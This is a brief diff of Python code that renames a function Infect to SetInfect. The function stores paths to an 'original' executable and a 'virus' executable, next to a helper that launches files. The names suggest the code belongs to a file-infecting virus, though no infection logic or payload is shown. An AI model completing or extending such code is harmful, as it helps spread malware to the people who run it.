@@ -8,7 +8,7 @@ VirusExePath = ""
 def RunFile(exepath):
     os.startfile(exepath)
 
-def Infect(OrgExePatharg, VirusExePatharg):
+def SetInfect(OrgExePatharg, VirusExePatharg):
     global OrgExePath
     global VirusExePath
     OrgExePath = OrgExePatharg
